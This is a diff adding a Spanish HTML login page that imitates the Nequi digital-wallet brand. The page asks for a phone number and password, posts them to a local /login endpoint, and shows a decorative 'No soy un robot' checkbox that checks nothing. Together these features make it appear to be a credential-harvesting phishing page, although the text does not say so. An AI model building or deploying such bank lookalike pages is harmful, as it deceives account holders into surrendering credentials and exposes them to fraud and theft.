@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar Sesión - Nequi</title>
+    <style>
+        body {
+            background-color: #f8d3e0;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background-color: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            text-align: center;
+        }
+        .login-container h1 {
+            color: #5c2d5b;
+            margin-bottom: 10px;
+        }
+        .login-container p {
+            color: #666;
+            margin-bottom: 20px;
+        }
+        .login-container input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+        .login-container button {
+            background-color: #d5006d;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+            transition: background-color 0.3s;
+        }
+        .login-container button:hover {
+            background-color: #a4004f;
+        }
+        .captcha-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 10px 0;
+        }
+        .register-link {
+            margin-top: 15px;
+            display: block;
+            color: #5c2d5b;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h1>Entra a tu Necli</h1>
+        <p>Podrás bloquear tu Necli, consultar tus datos.</p>
+
+        <form action="/login" method="POST">
+            <input type="text" placeholder="Número de celular" name="telefono" required>
+            <input type="password" placeholder="Contraseña" name="contraseña" required>
+            <div class="captcha-container">
+                <input type="checkbox" id="captcha"> <label for="captcha">No soy un robot</label>
+            </div>
+            <button type="submit">Entrar</button>
+        </form>
+        <a href="/register" class="register-link">¿No tienes cuenta? Regístrate aquí</a>
+    </div>
+</body>
+</html>
